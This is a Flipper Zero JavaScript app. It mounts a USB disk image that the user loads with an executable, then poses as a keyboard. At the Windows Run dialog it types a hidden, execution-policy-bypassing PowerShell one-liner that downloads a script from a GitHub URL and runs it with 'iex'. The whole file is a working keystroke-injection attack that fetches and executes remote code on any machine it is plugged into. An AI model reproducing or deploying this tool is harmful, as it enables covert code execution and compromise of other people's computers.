let usbdisk = require("usbdisk");
let storage = require("storage");
let badusb = require("badusb");
let notify = require("notification");
let submenu = require("submenu");
let dialog = require("dialog");
submenu.setHeader("What size for image?");
submenu.addItem("64MB", 0);
submenu.addItem("128MB", 1);
submenu.addItem("256MB", 2);
submenu.addItem("512MB", 3);
let result = submenu.show();

let diskPath = "";
let imgSize = 0; // mb

if (result === 0) {
  diskPath = "/ext/apps_data/mass_storage/64MB.img";
  imgSize = 64; // mb
}
if (result === 1) {
  diskPath = "/ext/apps_data/mass_storage/128MB.img";
  imgSize = 128; // mb
}
if (result === 2) {
  diskPath = "/ext/apps_data/mass_storage/256MB.img";
  imgSize = 256; // mb
}
if (result === 3) {
  diskPath = "/ext/apps_data/mass_storage/512MB.img";
  imgSize = 512; // mb
}

print("Img size: " + to_string(imgSize) + "mb");
if (!storage.exists(diskPath)) {
  print("Creating image...");
  usbdisk.createImage(diskPath, imgSize * 1024 * 1024);
  usbdisk.start(diskPath);
  notify.error();
  print("Format the disk...");
  while (!dialog.message("Format disk", "Press OK when disk is formatted")) {
    delay(250);
  }
  print("User formatted disk");
  notify.error();
  while (
    !dialog.message(
      "Add executable",
      "Press OK when executable is added. Follow instructions."
    )
  ) {
    delay(250);
  }
  notify.success();
  usbdisk.stop();
}

print("Starting badusb...");

badusb.setup({
  vid: 0xaaaa,
  pid: 0xbbbb,
  mfr_name: "Flipper",
  prod_name: "Zero",
});
// Wait until connected
print("Connect device to USB");
while (!badusb.isConnected()) {
  notify.blink("red", "short");
  delay(1000);
}

// After connected
print("USB is connected");
notify.success();
badusb.press("GUI", "r");
delay(500);
badusb.println(
  "powershell -w h -Ep Bypass irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/Script-runner/Run-script.ps1 | iex"
);
badusb.quit();
delay(4000);
print("Running script");

usbdisk.start(diskPath);
notify.success();
